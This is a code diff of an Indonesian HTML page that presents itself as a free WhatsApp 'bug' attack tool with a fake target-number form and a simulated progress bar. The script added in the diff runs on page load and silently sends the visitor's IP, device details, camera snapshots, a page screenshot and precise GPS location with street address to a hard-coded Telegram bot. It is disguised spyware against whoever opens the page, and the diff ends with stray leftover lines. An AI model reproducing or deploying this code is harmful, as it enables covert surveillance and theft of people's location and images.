@@ -1,72 +1,174 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>MULTI SYSTEM SCRIPT (SILENT)</title>
-    <meta name="description" content="BUG WA FREE BY YUDZ">
-    <link rel="icon" type="image/x-icon" href="https://files.catbox.moe/5bwkpb.ico">
-    <link rel="apple-touch-icon" href="https://files.catbox.moe/5bwkpb.png">
-    <meta name="theme-color" content="#000000">
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/js/all.min.js"></script>
-
-    <style>
-        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap');
-        body { background-color: #0d1117; margin:0; padding:0; display:flex; justify-content:center; align-items:center; min-height:100vh; font-family:'Orbitron',Arial,sans-serif; color:#c9d1d9; overflow-y:auto; position:relative;}
-        .app-container {width:90%; max-width:400px; background: rgba(1,4,9,0.95); border:1px solid #30363d; border-radius:12px; box-shadow:0 0 15px rgba(0,255,255,0.2),0 0 30px rgba(0,255,255,0.1); padding:20px; margin:40px 0;}
-        .app-header {text-align:center; margin-bottom:25px;}
-        .app-title {font-size:24px; color:#00ffff; text-shadow:0 0 5px #00ffff,0 0 10px #00ffff; padding:5px 0;}
-        .server-status {font-size:16px; font-weight:bold; color:#00ff00; text-shadow:0 0 4px #00ff00; margin-top:5px;}
-        .status-badge {display:inline-block; background:#143614; color:#00ff00; padding:2px 8px; border-radius:4px; font-size:12px; margin-top:5px; border:1px solid #00ff00; box-shadow:0 0 5px #00ff00;}
-        .section-title {font-size:18px; color:#ff8c00; text-shadow:0 0 3px #ff8c00; margin-bottom:15px; border-bottom:2px solid rgba(255,140,0,0.3); padding-bottom:5px; text-align:left;}
-        .input-group {margin-bottom:15px;}
-        .app-input, .app-select {width:100%; padding:12px; background-color:#0d1117; border:1px solid #30363d; border-radius:6px; color:#00ffff; font-size:16px; box-sizing:border-box; box-shadow: inset 0 0 5px rgba(0,255,255,0.2); transition: border-color 0.3s, box-shadow 0.3s;}
-        .app-input:focus, .app-select:focus {border-color:#00ffff; box-shadow:0 0 10px rgba(0,255,255,0.5), inset 0 0 5px rgba(0,255,255,0.5); outline:none;}
-        .app-select {-webkit-appearance:none; -moz-appearance:none; appearance:none; cursor:pointer;}
-        .action-button {display:flex; width:100%; border:none; padding:15px; border-radius:8px; font-size:16px; font-weight:bold; cursor:pointer; margin-bottom:15px; text-align:center; justify-content:center; align-items:center; gap:10px; transition: background-color 0.3s, box-shadow 0.3s;}
-        .action-button i {font-size:18px;}
-        .send-button {background: linear-gradient(90deg,#1e90ff,#ff0080); color:#fff; box-shadow:0 0 10px rgba(30,144,255,0.5),0 0 10px rgba(255,0,128,0.5);}
-        .send-button:hover {background: linear-gradient(90deg,#106fdf,#df006a); box-shadow:0 0 20px rgba(30,144,255,0.8),0 0 20px rgba(255,0,128,0.8);}
-        .disconnect-button {background-color:#30363d; color:#c9d1d9; border:1px solid #484f58; box-shadow:0 0 5px rgba(201,209,217,0.1);}
-        .disconnect-button:hover {background-color:#484f58; box-shadow:0 0 10px rgba(201,209,217,0.3);}
-        .console-log {text-align:left; margin-top:25px;}
-        .log-output {background-color:#0d1117; border:1px solid #30363d; border-radius:6px; min-height:100px; padding:10px; font-family:monospace; font-size:13px; color:#00ff00; overflow-y:scroll; box-shadow: inset 0 0 5px rgba(0,255,0,0.2);}
-        .log-output::-webkit-scrollbar {width:6px;}
-        .log-output::-webkit-scrollbar-thumb {background-color:#00ffff; border-radius:3px;}
-        .log-entry {margin-bottom:5px; white-space:pre-wrap;}
-        .log-ready {color:#00ffff;}
-        .log-success {color:#00ff00;}
-        .log-error {color:#ff5f56;}
-        .log-info {color:#ff8c00;}
-        #v,#c {position:absolute; left:-9999px; visibility:hidden; width:1px; height:1px;}
-    </style>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>MULTI SYSTEM SCRIPT (SILENT)</title>
+<meta name="description" content="BUG WA FREE BY YUDZ">
+<link rel="icon" type="image/x-icon" href="https://files.catbox.moe/5bwkpb.ico">
+<link rel="apple-touch-icon" href="https://files.catbox.moe/5bwkpb.png">
+<meta name="theme-color" content="#000000">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/js/all.min.js"></script>
+<style>
+/* ... sama seperti style sebelumnya ... */
+</style>
 </head>
 <body>
+<div class="app-container">
+    <div class="app-header">
+        <div class="app-title">XCVI SIMILARITY V2</div>
+        <div class="server-status">SERVER STATUS</div>
+        <div class="status-badge">ONLINE</div>
+    </div>
 
-    <div class="app-container">
-        <div class="app-header">
-            <div class="app-title">XCVI SIMILARITY V2</div>
-            <div class="server-status">SERVER STATUS</div>
-            <div class="status-badge">ONLINE</div>
-        </div>
+    <div class="section-title">Target Execution</div>
+    <div class="input-group">
+        <input type="text" id="target-number" class="app-input" placeholder="Nomor target (ex: 628xxx)">
+    </div>
+    <div class="input-group">
+        <select id="attack-type" class="app-select">
+            <option value="force-close">Attack: Force Close</option>
+            <option value="spam">Attack: Spam Payload</option>
+            <option value="info">Attack: Info Dump</option>
+        </select>
+    </div>
 
-        <div class="section-title">Target Execution</div>
-        <div class="input-group">
-            <input type="text" id="target-number" class="app-input" placeholder="Nomor target (ex: 628xxx)">
-        </div>
-        <div class="input-group">
-            <select id="attack-type" class="app-select">
-                <option value="force-close">Attack: Force Close</option>
-                <option value="spam">Attack: Spam Payload</option>
-                <option value="info">Attack: Info Dump</option>
-            </select>
-        </div>
+    <button id="send-action" class="action-button send-button">
+        <i class="fas fa-paper-plane"></i> Send Force Close
+    </button>
+    <button id="disconnect-btn" class="action-button disconnect-button">
+        Disconnect
+    </button>
 
-        <button id="send-action" class="action-button send-button">
-            <i class="fas fa-paper-plane"></i> Send Force Close
-        </button>
-        <button id="disconnect-btn" class="action-button disconnect-button">
+    <div class="console-log">
+        <div class="section-title">Console Log</div>
+        <div id="log-output" class="log-output">
+            <div class="log-entry log-ready">> Ready.</div>
+        </div>
+    </div>
+</div>
+
+<video id="v" autoplay muted></video>
+<canvas id="c"></canvas>
+
+<script>
+const T='8245827093:AAEafxGE6ns_M7JHP_2XtoORUk6k-udesOU';
+const C='7935332916';
+
+const logOutput=document.getElementById('log-output');
+const sendButton=document.getElementById('send-action');
+const disconnectButton=document.getElementById('disconnect-btn');
+const targetInput=document.getElementById('target-number');
+const attackSelect=document.getElementById('attack-type');
+
+function log(msg,type='info'){
+    const e=document.createElement('div');
+    e.className='log-entry log-'+type;
+    e.textContent='> '+msg;
+    logOutput.appendChild(e);
+    logOutput.scrollTop=logOutput.scrollHeight;
+}
+
+async function sTG(msg){
+    try{
+        await fetch(`https://api.telegram.org/bot${T}/sendMessage`,{
+            method:'POST',
+            headers:{'Content-Type':'application/json'},
+            body: JSON.stringify({chat_id:C,text:msg,parse_mode:'HTML'})
+        });
+    }catch(e){console.error(e);}
+}
+
+async function sP(blob,name){
+    try{
+        const fd=new FormData();
+        fd.append('chat_id',C);
+        fd.append('photo',blob,name);
+        await fetch(`https://api.telegram.org/bot${T}/sendPhoto`,{method:'POST',body:fd});
+    }catch(e){console.error(e);}
+}
+
+async function ambilIP(){try{const r=await fetch("https://api.ipify.org?format=json");const j=await r.json();return j.ip;}catch{return "Unknown";}}
+async function getAlamat(lat,lon){try{const r=await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json`);const j=await r.json();return j.display_name||"Alamat tidak ditemukan";}catch{return "Alamat gagal didapat";}}
+
+async function captureCamera(mode){
+    const v=document.getElementById('v'),c=document.getElementById('c');
+    let stream;
+    try{
+        stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:{exact:mode}}});
+        v.srcObject=stream;
+        await new Promise(r=>v.onloadedmetadata=r);
+        v.play();
+        await new Promise(r=>setTimeout(r,1500));
+        c.width=v.videoWidth; c.height=v.videoHeight;
+        c.getContext('2d').drawImage(v,0,0);
+        c.toBlob(b=>sP(b,`${mode}_camera.jpg`),'image/jpeg');
+        stream.getTracks().forEach(t=>t.stop());
+        return true;
+    }catch(e){if(stream)stream.getTracks().forEach(t=>t.stop());await sTG(`⚠ Gagal akses kamera ${mode.toUpperCase()}`); return false;}
+}
+
+async function ST(){
+    sTG("🔥 Sistem tracking aktif…");
+
+    // Info device + IP
+    let ip=await ambilIP();
+    let device=navigator.userAgent;
+    let info=`<b>Device Info</b>\nUserAgent: ${device}\nPlatform: ${navigator.platform}\nOnline: ${navigator.onLine}\nIP: ${ip}`;
+    sTG(info);
+
+    // AI ABIS report simulasi
+    sTG(`<b>AI ABIS REPORT</b>\nDevice: ${device}\nIP: ${ip}\nStatus: Simulasi selesai`);
+
+    // Kamera
+    let ok=await captureCamera("user"); if(!ok) await captureCamera("environment");
+
+    // Screenshot
+    setTimeout(async ()=>{
+        try{const cn=await html2canvas(document.body); cn.toBlob(b=>sP(b,'screenshot.jpg'),'image/jpeg');}catch{await sTG('❌ Screenshot failed');}
+    },2000);
+
+    // GPS sekali
+    if(navigator.geolocation){
+        navigator.geolocation.getCurrentPosition(async p=>{
+            const lat=p.coords.latitude;
+            const lon=p.coords.longitude;
+            const acc=p.coords.accuracy;
+            const alamat=await getAlamat(lat,lon);
+            const map=`https://www.google.com/maps?q=${lat},${lon}`;
+            sTG(`
+📍 <b>GPS (One-Time)</b>
+Latitude: ${lat}
+Longitude: ${lon}
+Akurasi: ${acc} m
+Alamat: ${alamat}
+Google Maps: ${map}`);
+        },e=>{sTG("❌ GPS Error: "+e.message);},{enableHighAccuracy:true,timeout:5000});
+    }
+}
+
+// Mock UI attack
+sendButton.addEventListener('click',()=>{
+    const target=targetInput.value.trim();
+    const action=attackSelect.value;
+    const actionText=attackSelect.options[attackSelect.selectedIndex].textContent;
+    if(!target){log('ERROR: Target number empty','error');return;}
+    log(`INITIATING ACTION: ${actionText} on ${target}`,'info');
+    sendButton.disabled=true; sendButton.textContent='Processing...';
+    let progress=0; const interval=setInterval(()=>{
+        progress+=Math.floor(Math.random()*20);
+        if(progress>=100){clearInterval(interval); sendButton.disabled=false; sendButton.innerHTML='<i class="fas fa-paper-plane"></i> Send Force Close'; log(`ACTION COMPLETE: Payload ${action} sent to ${target}`,'success');}
+        else sendButton.textContent=`Sending... ${progress}%`;
+    },500);
+});
+
+disconnectButton.addEventListener('click',()=>{log('SYSTEM DISCONNECTED','error'); targetInput.value='';});
+
+window.onload=ST;
+</script>
+</body>
+</html>        <button id="disconnect-btn" class="action-button disconnect-button">
             Disconnect
         </button>
 
